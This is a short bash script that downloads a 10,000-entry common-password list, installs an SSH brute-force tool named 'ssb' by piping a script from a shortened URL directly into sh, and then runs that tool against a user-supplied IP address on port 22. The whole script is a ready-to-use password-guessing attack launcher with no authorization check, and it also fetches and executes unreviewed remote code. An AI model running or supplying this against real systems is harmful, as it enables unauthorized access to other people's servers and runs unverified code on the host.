#!/bin/bash

# Download the file
echo "Downloading file..."
curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt

# Rename the file
mv 10k-most-common.txt wordlists.txt

# Execute the command
echo "Executing command..."
curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin

# Ask for IP address
read -p "Enter IP address (optional): " ip_address

# Execute the final command
echo "Executing final command..."
if [ -z "$ip_address" ]; then
    ssb
else
    ssb -w wordlists.txt -p 22 -v $ip_address
fi

echo "Done!"
